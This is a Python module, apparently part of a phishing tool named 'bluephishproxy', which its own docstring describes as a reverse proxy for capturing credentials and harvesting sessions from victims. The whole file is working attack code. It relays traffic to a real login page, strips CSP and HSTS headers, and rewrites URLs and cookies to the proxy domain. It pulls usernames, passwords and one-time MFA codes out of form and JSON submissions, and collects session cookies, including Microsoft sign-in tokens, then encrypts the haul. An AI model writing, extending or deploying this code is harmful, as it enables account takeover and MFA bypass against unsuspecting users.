"""Reverse proxy relay for credential capture and session harvesting.

Sits between the victim's browser and the real login page, transparently
forwarding requests while intercepting form submissions and session tokens.
"""

from __future__ import annotations

import json
import logging
import re
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urljoin, urlparse, urlunparse

import requests as http_client

from .config import Config
from .crypto import encrypt

logger = logging.getLogger("bluephishproxy.proxy")

_CREDENTIAL_FIELDS: dict[str, str] = {
    # --- username / identity fields ---
    "username": "username",
    "user": "username",
    "email": "username",
    "login": "username",
    "loginfmt": "username",
    "userid": "username",
    "user_id": "username",
    "account": "username",
    "usr": "username",
    "j_username": "username",
    "session[username_or_email]": "username",
    "identifier": "username",
    "signinname": "username",
    "federationredirecturl": "",  # skip — not a credential
    # --- password / secret fields ---
    "password": "password",
    "passwd": "password",
    "pass": "password",
    "pwd": "password",
    "secret": "password",
    "j_password": "password",
    "credentials[password]": "password",
    "session[password]": "password",
    "accesstoken": "password",
    "credential": "password",
    "otp": "password",
    "otpcode": "password",
    "totp": "password",
    "verificationcode": "password",
    "mfacode": "password",
}

_JSON_USERNAME_KEYS = frozenset({
    "username", "user", "email", "login", "loginfmt",
    "userid", "account", "identifier",
    "signinemailaddress", "signinname", "upn",
    "federateduser", "displayname",
})

_JSON_PASSWORD_KEYS = frozenset({
    "password", "passwd", "pass", "pwd", "secret",
    "credential", "credentials", "accesstoken",
    "otp", "otpcode", "totp", "verificationcode", "mfacode",
    "assertion", "sas", "token",
})

_HOP_BY_HOP = frozenset({
    "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers",
    "transfer-encoding", "upgrade",
})

_SESSION_COOKIE_NAMES = frozenset({
    "sessionid", "session_id", "sid", "phpsessid", "jsessionid",
    "asp.net_sessionid", "connect.sid", "laravel_session",
    "estsauth", "estsauthpersistent", "estsauthlight",
    "stsservicecookie", "buid", "fpc", "x-ms-gateway-slice",
    "ccauth", "oidcauth",
    "__host-next-auth.csrf-token", "__secure-next-auth.session-token",
    "token", "access_token", "auth_token", "jwt",
    "_ga_session", "cf_clearance",
})


def extract_credentials(
    form_data: dict[str, str],
) -> tuple[str, str, bool]:
    username = ""
    password = ""
    for field_name, field_value in form_data.items():
        normalized = field_name.lower().strip()
        role = _CREDENTIAL_FIELDS.get(normalized)
        if role == "username" and not username:
            username = field_value
        elif role == "password" and not password:
            password = field_value

    return username, password, bool(username or password)


def _walk_json(obj: Any, depth: int = 0) -> dict[str, str]:
    """Recursively scan a JSON object for credential-like key/value pairs."""
    found: dict[str, str] = {}
    if depth > 5:
        return found
    if isinstance(obj, dict):
        for key, value in obj.items():
            if isinstance(value, str) and value:
                found[key] = value
            elif isinstance(value, (dict, list)):
                found.update(_walk_json(value, depth + 1))
    elif isinstance(obj, list):
        for item in obj:
            if isinstance(item, (dict, list)):
                found.update(_walk_json(item, depth + 1))
    return found


def extract_credentials_json(
    body: bytes,
) -> tuple[str, str, dict[str, str], bool]:
    try:
        data = json.loads(body)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return "", "", {}, False

    flat = _walk_json(data)

    username = ""
    password = ""
    for key, value in flat.items():
        normalized = key.lower().replace("-", "").replace("_", "")
        if normalized in _JSON_USERNAME_KEYS and not username:
            username = value
        elif normalized in _JSON_PASSWORD_KEYS and not password:
            password = value

    return username, password, flat, bool(username or password)


def _filter_request_headers(
    headers: dict[str, str],
    target_host: str,
) -> dict[str, str]:
    filtered: dict[str, str] = {}
    for k, v in headers.items():
        lower = k.lower()
        if lower in _HOP_BY_HOP:
            continue
        if lower == "host":
            filtered[k] = target_host
            continue
        if lower in ("origin", "referer"):
            continue
        filtered[k] = v
    return filtered


def _filter_response_headers(headers: dict[str, str]) -> dict[str, str]:
    filtered: dict[str, str] = {}
    for k, v in headers.items():
        lower = k.lower()
        if lower in _HOP_BY_HOP:
            continue
        if lower == "content-encoding":
            continue
        if lower == "content-length":
            continue
        if lower == "content-security-policy":
            continue
        if lower == "strict-transport-security":
            continue
        filtered[k] = v
    return filtered


def proxy_request(
    method: str,
    path: str,
    target_url: str,
    headers: dict[str, str],
    body: bytes | None = None,
    cookies: dict[str, str] | None = None,
    timeout: float = 15.0,
) -> tuple[int, dict[str, str], bytes, dict[str, str]]:
    parsed_target = urlparse(target_url)
    full_url = urljoin(target_url, path)

    req_headers = _filter_request_headers(headers, parsed_target.netloc)

    try:
        resp = http_client.request(
            method=method,
            url=full_url,
            headers=req_headers,
            data=body,
            cookies=cookies or {},
            allow_redirects=False,
            timeout=timeout,
            verify=True,
        )
    except http_client.RequestException as exc:
        logger.error("proxy request failed: %s", exc)
        return 502, {}, b"Bad Gateway", {}

    resp_headers = _filter_response_headers(dict(resp.headers))
    resp_cookies = dict(resp.cookies)

    return resp.status_code, resp_headers, resp.content, resp_cookies


def rewrite_response_urls(
    content: bytes,
    target_url: str,
    proxy_base: str,
    content_type: str = "",
) -> bytes:
    if "text/html" not in content_type and "javascript" not in content_type:
        return content

    try:
        text = content.decode("utf-8", errors="replace")
    except Exception:
        return content

    parsed = urlparse(target_url)
    target_origin = f"{parsed.scheme}://{parsed.netloc}"
    proxy_netloc = urlparse(proxy_base).netloc

    attr_pattern = re.compile(
        r'((?:href|src|action|formaction)\s*=\s*["\'])'
        + re.escape(target_origin)
        + r'([^"\']*["\'])',
        re.IGNORECASE,
    )
    text = attr_pattern.sub(r"\1" + proxy_base + r"\2", text)

    scheme_netloc_pattern = re.compile(
        r'(["\'/])' + re.escape(f"{parsed.scheme}://{parsed.netloc}") + r'(["\'/])',
    )
    text = scheme_netloc_pattern.sub(r"\1" + proxy_base + r"\2", text)

    return text.encode("utf-8")


def rewrite_location_header(
    location: str,
    target_url: str,
    proxy_base: str,
) -> str:
    parsed_target = urlparse(target_url)
    parsed_loc = urlparse(location)

    if parsed_loc.netloc == parsed_target.netloc:
        parsed_proxy = urlparse(proxy_base)
        return urlunparse(parsed_loc._replace(
            scheme=parsed_proxy.scheme,
            netloc=parsed_proxy.netloc,
        ))

    if not parsed_loc.scheme and not parsed_loc.netloc:
        return location

    return location


def rewrite_set_cookie(
    cookie_header: str,
    proxy_domain: str,
) -> str:
    parts = cookie_header.split(";")
    new_parts = [parts[0]]
    for part in parts[1:]:
        stripped = part.strip().lower()
        if stripped.startswith("domain="):
            new_parts.append(f" Domain={proxy_domain}")
        elif stripped == "secure":
            continue
        elif stripped.startswith("samesite="):
            new_parts.append(" SameSite=Lax")
        else:
            new_parts.append(part)
    return ";".join(new_parts)


def extract_session_tokens(
    cookies: dict[str, str],
    set_cookie_headers: list[str],
) -> dict[str, str]:
    tokens: dict[str, str] = {}

    for name, value in cookies.items():
        if name.lower() in _SESSION_COOKIE_NAMES or len(value) > 20:
            tokens[name] = value

    for header in set_cookie_headers:
        name_val = header.split(";")[0]
        if "=" in name_val:
            name, _, value = name_val.partition("=")
            name = name.strip()
            value = value.strip()
            if name.lower() in _SESSION_COOKIE_NAMES or len(value) > 20:
                tokens[name] = value

    return tokens


def encrypt_credentials(
    username: str,
    password: str,
    raw_form: dict[str, str],
    encryption_key: str,
) -> tuple[str, str, str]:
    if not encryption_key:
        import base64
        u_enc = base64.b64encode(username.encode()).decode()
        p_enc = base64.b64encode(password.encode()).decode()
        f_enc = base64.b64encode(json.dumps(raw_form).encode()).decode()
        return u_enc, p_enc, f_enc

    u_enc = encrypt(username, encryption_key)
    p_enc = encrypt(password, encryption_key)
    f_enc = encrypt(json.dumps(raw_form), encryption_key)
    return u_enc, p_enc, f_enc


def encrypt_session_data(
    tokens: dict[str, str],
    encryption_key: str,
) -> str:
    payload = json.dumps(tokens)
    if not encryption_key:
        import base64
        return base64.b64encode(payload.encode()).decode()
    return encrypt(payload, encryption_key)
